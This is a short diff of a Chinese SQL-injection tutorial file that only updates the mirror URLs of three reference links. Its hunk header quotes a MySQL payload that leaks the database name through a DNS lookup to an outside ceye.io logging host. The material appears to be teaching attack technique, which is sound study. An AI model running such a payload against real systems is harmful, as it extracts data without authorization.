@@ -246,8 +246,8 @@ mysql> select load_file(concat('\\\\',(select database()),'.xxx.ceye.io\\abc'));
 
 ## 参考资料
 
--   [SQL 注入速查表](http://static.hx99.net/static/drops/tips-7840.html)
--   [MySQL 注入技巧](http://static.hx99.net/static/drops/tips-7299.html)
--   [MySQL 注入科普](http://static.hx99.net/static/drops/tips-123.html)
+-   [SQL 注入速查表](http://drops.xmd5.com/static/drops/tips-7840.html)
+-   [MySQL 注入技巧](http://drops.xmd5.com/static/drops/tips-7299.html)
+-   [MySQL 注入科普](http://drops.xmd5.com/static/drops/tips-123.html)
 -   [MySQL 注入总结](http://www.91ri.org/4073.html)
 -   [《SQL 注入攻击与防御》](http://product.dangdang.com/23364650.html)
